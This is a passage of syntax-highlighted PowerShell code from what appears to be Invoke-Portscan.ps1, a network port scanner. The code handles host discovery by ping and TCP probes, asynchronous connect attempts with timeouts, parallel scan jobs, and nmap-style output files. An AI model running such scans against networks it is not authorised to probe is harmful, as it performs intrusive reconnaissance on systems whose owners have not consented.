<span class="hljs-number">3000</span> &#125;<br>                    <span class="hljs-number">1</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">10</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">5000</span> &#125;<br>                    default &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid T parameter&quot;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-variable">$grepStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$xmlStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$readableStream</span> = <span class="hljs-variable">$null</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$AllformatsOut</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$XmlOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$ReadableOut</span>) &#123;<br>                     <span class="hljs-built_in">Write-Warning</span> <span class="hljs-string">&quot;Both -oA specified with other output... going to ignore -oG/-oN/-oX&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$GrepOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.gnmap&quot;</span><br>                <span class="hljs-variable">$XmlOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.xml&quot;</span><br>                <span class="hljs-variable">$ReadableOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.nmap&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$GrepOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$AllformatsOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$grepStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$GrepOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ReadableOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$ReadableOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$ReadableOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$readableStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$ReadableOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XmlOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$XmlOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$XmlOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br><br>                <span class="hljs-variable">$xmlStream</span> =   [<span class="hljs-type">System.xml.xmlwriter</span>]::Create([<span class="hljs-built_in">string</span>]<span class="hljs-variable">$XmlOut</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartDocument()<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Portscanrun&quot;</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-variable">$version</span>)<br><br>            &#125;<br><br>            Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$DiscoveryPorts</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$hostPortList</span> | <span class="hljs-built_in">Out-Null</span><br><br>            <span class="hljs-variable">$startdate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$myInvocationLine</span> = <span class="hljs-variable">$PSCmdlet</span>.MyInvocation.Line<br>            <span class="hljs-variable">$startMsg</span> = <span class="hljs-string">&quot;Invoke-Portscan.ps1 v<span class="hljs-variable">$version</span> scan initiated <span class="hljs-variable">$startdate</span> as: <span class="hljs-variable">$myInvocationLine</span>&quot;</span><br><br>            <span class="hljs-comment">#TODO deal with output</span><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-comment"># #converting back from int array gives some argument error checking</span><br>            <span class="hljs-comment"># $sPortList = [string]::join(&quot;,&quot;, $portList)</span><br>            <span class="hljs-comment"># $sHostPortList = [string]::join(&quot;,&quot;, $hostPortList)</span><br><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-comment">#Port Scan Code - run on a per host basis</span><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-variable">$portScanCode</span> = &#123;<br>                <span class="hljs-keyword">param</span> (<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$thost</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$PortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$hostPortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$maxthreads</span>)<br>                <span class="hljs-keyword">Process</span><br>                &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$closedPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>                <span class="hljs-variable">$sockets</span> = <span class="hljs-selector-tag">@</span>&#123;&#125;<br>                <span class="hljs-variable">$timeouts</span> = <span class="hljs-built_in">New-Object</span> Hashtable<br><br>                <span class="hljs-comment">#set maximum $async threads</span><br>                <span class="hljs-variable">$fThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                <span class="hljs-variable">$aThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::GetMaxThreads([<span class="hljs-type">ref</span>]<span class="hljs-variable">$fThreads</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$aThreads</span>) | <span class="hljs-built_in">Out-Null</span><br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::SetMaxThreads(<span class="hljs-variable">$fthreads</span>,<span class="hljs-variable">$maxthreads</span>) | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">New-ScriptBlockCallback</span></span> &#123;<br>                    <span class="hljs-keyword">param</span>(<br>                        [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<br>                        [<span class="hljs-type">ValidateNotNullOrEmpty</span>()]<br>                        [<span class="hljs-type">scriptblock</span>]<span class="hljs-variable">$Callback</span><br>                    )<br><br>                    <span class="hljs-comment">#taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-string">&quot;CallbackEventBridge&quot;</span> <span class="hljs-operator">-as</span> [<span class="hljs-type">type</span>])) &#123;<br>                        <span class="hljs-built_in">Add-Type</span> <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                            using System;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            public sealed class CallbackEventBridge</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                public event AsyncCallback CallbackComplete = delegate &#123; &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private CallbackEventBridge() &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private void CallbackInternal(IAsyncResult result)</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    CallbackComplete(result);</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public AsyncCallback Callback</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    get &#123; return new AsyncCallback(CallbackInternal); &#125;</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public static CallbackEventBridge Create()</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    return new CallbackEventBridge();</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$bridge</span> = [<span class="hljs-type">CallbackEventBridge</span>]::Create()<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$bridge</span> <span class="hljs-literal">-EventName</span> CallbackComplete <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Callback</span> | <span class="hljs-built_in">Out-Null</span><br><br>                    <span class="hljs-variable">$bridge</span>.Callback<br><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Test-Port</span></span> &#123;<br><br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$p</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$timeout</span><br>                    )<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-variable">$pAddress</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$h</span>)<br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient <span class="hljs-variable">$pAddress</span>.AddressFamily<br><br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> &#123;<br>                        <span class="hljs-comment">#we&#x27;re assuming this is a host name</span><br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient<br>                    &#125;<br><br>                    <span class="hljs-variable">$scriptBlockAsString</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        #somewhat of a race condition with the timeout, but I don&#x27;t think it matters</span><br><span class="hljs-string">                        if ( `$sockets[<span class="hljs-variable">$p</span>] -ne `$NULL)</span><br><span class="hljs-string">                        &#123;</span><br><span class="hljs-string">                            if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                                `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$status = `$sockets[<span class="hljs-variable">$p</span>].Connected;</span><br><span class="hljs-string">                            if (`$status -eq `$True)</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is open&quot;</span><br><span class="hljs-string">                                `$openPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            else</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is closed&quot;</span><br><span class="hljs-string">                                `$closedPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            `$sockets[<span class="hljs-variable">$p</span>].Close();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    <span class="hljs-variable">$timeoutCallback</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                        #write-host &quot;<span class="hljs-variable">$p</span> is filtered&quot;</span><br><span class="hljs-string">                        `$sockets[<span class="hljs-variable">$p</span>].Close()</span><br><span class="hljs-string">                        if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                            `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            `$filteredPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">                        `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">&quot;@</span><br><br>                    <span class="hljs-variable">$timeoutCallback</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$timeoutCallback</span>)<br><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">New-Object</span> System.Timers.Timer<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] <span class="hljs-literal">-EventName</span> Elapsed <span class="hljs-literal">-Action</span> <span class="hljs-variable">$timeoutCallback</span> | <span class="hljs-built_in">Out-Null</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Interval = <span class="hljs-variable">$timeout</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Enabled = <span class="hljs-variable">$true</span><br><br>                    <span class="hljs-variable">$myscriptblock</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$scriptBlockAsString</span>)<br>                    <span class="hljs-variable">$Null</span> = <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>].beginConnect(<span class="hljs-variable">$h</span>, <span class="hljs-variable">$p</span>,(<span class="hljs-built_in">New-ScriptBlockCallback</span>(<span class="hljs-variable">$myscriptblock</span>)) , <span class="hljs-variable">$null</span>)<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PortScan-Alive</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    <span class="hljs-keyword">Try</span><br>                    &#123;<br><br>                        <span class="hljs-comment">#ping</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hostPortList</span>.Contains(<span class="hljs-literal">-1</span>))<br>                        &#123;<br>                            <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">new-object</span> System.Net.NetworkInformation.Ping<br>                            <span class="hljs-variable">$pResult</span> = <span class="hljs-variable">$ping</span>.send(<span class="hljs-variable">$h</span>)<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pResult</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>)<br>                            &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostPortList</span>)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Port</span> <span class="hljs-operator">-ne</span> <span class="hljs-literal">-1</span>)<br>                            &#123;<br>                                <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">do</span> &#123;<br>                            <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">100</span><br>                            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$openPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$closedPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)) &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">While</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)<br><br>                    &#125;<br>                    <span class="hljs-keyword">Catch</span><br>                    &#123;<br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to host scan <span class="hljs-variable">$h</span>&quot;</span><br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Portscan-Port</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    [<span class="hljs-built_in">string</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>()<br><br>                    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Portlist</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">Try</span><br>                        &#123;<br>                            <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                        &#125;<br>                        <span class="hljs-keyword">Catch</span><br>                        &#123;<br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to scan <span class="hljs-variable">$h</span> port <span class="hljs-variable">$Port</span>&quot;</span><br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = <span class="hljs-variable">$False</span><br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$SkipDiscovery</span>)<br>                &#123;<br>                    [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = PortScan<span class="hljs-literal">-Alive</span> <span class="hljs-variable">$thost</span><br>                    <span class="hljs-variable">$openPorts</span>.clear()<br>                    <span class="hljs-variable">$closedPorts</span>.clear()<br>                    <span class="hljs-variable">$filteredPorts</span>.Clear()<br>                &#125;<br>                <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$PingOnly</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$hostResult</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>))<br>                &#123;<br>                    Portscan<span class="hljs-literal">-Port</span> <span class="hljs-variable">$thost</span><br>                &#125;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">500</span><br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$hostResult</span>, <span class="hljs-variable">$openPorts</span>, <span class="hljs-variable">$closedPorts</span>, <span class="hljs-variable">$filteredPorts</span>)<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment"># the outer loop is to flush the loop.</span><br>            <span class="hljs-comment"># Otherwise Get-Job | Wait-Job could clog, etc</span><br><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$saveIteration</span> = <span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$computersDone</span>=<span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$upHosts</span>=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$saveIteration</span> * <span class="hljs-variable">$SyncFreq</span>) <span class="hljs-operator">-lt</span> <span class="hljs-variable">$hostList</span>.Count)<br>            &#123;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Remove-Job</span> <span class="hljs-literal">-Force</span><br>                <span class="hljs-variable">$sIndex</span> = (<span class="hljs-variable">$saveIteration</span>*<span class="hljs-variable">$SyncFreq</span>)<br>                <span class="hljs-variable">$eIndex</span> = ((<span class="hljs-variable">$saveIteration</span>+<span class="hljs-number">1</span>)*<span class="hljs-variable">$SyncFreq</span>)<span class="hljs-literal">-1</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostList</span>[<span class="hljs-variable">$sIndex</span><span class="hljs-type">..</span><span class="hljs-variable">$eIndex</span>])<br>                &#123;<br>                    <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$ctr</span>.Count <span class="hljs-operator">-ge</span> <span class="hljs-variable">$nHosts</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milliseconds</span> <span class="hljs-variable">$SleepTimer</span><br>                        <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    &#125;<br><br>                    <span class="hljs-variable">$computersDone</span>++<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$noProgressMeter</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Write-Progress</span> <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;Port Scanning&quot;</span> <span class="hljs-literal">-Activity</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-CurrentOperation</span> <span class="hljs-string">&quot;starting computer <span class="hljs-variable">$computersDone</span>&quot;</span>  <span class="hljs-literal">-PercentComplete</span> (<span class="hljs-variable">$computersDone</span> / <span class="hljs-variable">$hostList</span>.Count * <span class="hljs-number">100</span>)<br>                    &#125;<br><br>                    <span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> <span class="hljs-variable">$portScanCode</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$iHost</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$iHost</span>, <span class="hljs-variable">$SkipDiscovery</span>, <span class="hljs-variable">$PingOnly</span>, <span class="hljs-variable">$Timeout</span>, <span class="hljs-variable">$portList</span>, <span class="hljs-variable">$hostPortList</span>, <span class="hljs-variable">$Threads</span>)  | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Wait-Job</span> | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$job</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-Job</span>)<br>                &#123;<br>                    <span class="hljs-variable">$jobOut</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Receive-Job</span> <span class="hljs-variable">$job</span>)<br>                    [<span class="hljs-built_in">bool</span>]<span class="hljs-variable">$hostUp</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">0</span>]<br>                    <span class="hljs-variable">$jobName</span> = <span class="hljs-variable">$job</span>.Name<br><br>                    <span class="hljs-variable">$openPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">1</span>]<br>                    <span class="hljs-variable">$closedPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">2</span>]<br>                    <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-variable">$jobOut</span><span class="hljs-function">[<span class="hljs-number">3</span>]</span><br><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hostUp</span>) &#123;<br>                        <span class="hljs-variable">$upHosts</span> ++<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$quiet</span>)<br>                    &#123;<br>                        <span class="hljs-variable">$hostDate</span> = <span class="hljs-built_in">Get-Date</span><br>                        <span class="hljs-variable">$hostObj</span> = <span class="hljs-built_in">New-Object</span> System.Object<br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> Hostname <span class="hljs-literal">-Value</span> <span class="hljs-variable">$jobName</span><br><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> alive <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostUp</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> openPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$openPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> closedPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$closedPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> filteredPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$filteredPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> NoteProperty <span class="hljs-literal">-Name</span> finishTime <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostDate</span><br><br>                        <span class="hljs-variable">$scannedHostList</span> += <span class="hljs-variable">$hostobj</span><br>                    &#125;<br><br>                    <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-outhost</span> <span class="hljs-variable">$jobName</span> <span class="hljs-literal">-isUp</span> <span class="hljs-variable">$hostUp</span> <span class="hljs-literal">-openPorts</span> <span class="hljs-variable">$openPorts</span> <span class="hljs-literal">-closedPorts</span> <span class="hljs-variable">$closedPorts</span> <span class="hljs-literal">-filteredPorts</span> <span class="hljs-variable">$filteredPorts</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span> <span class="hljs-literal">-SkipDiscovery</span> <span class="hljs-variable">$SkipDiscovery</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                    <span class="hljs-variable">$grepStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                    <span class="hljs-variable">$xmlStream</span>.flush()<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                    <span class="hljs-variable">$readableStream</span>.flush()<br>                &#125;<br><br>                <span class="hljs-variable">$saveIteration</span> ++<br>            &#125;<br><br>            <span class="hljs-variable">$enddate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$totaltime</span> = (<span class="hljs-variable">$enddate</span> - <span 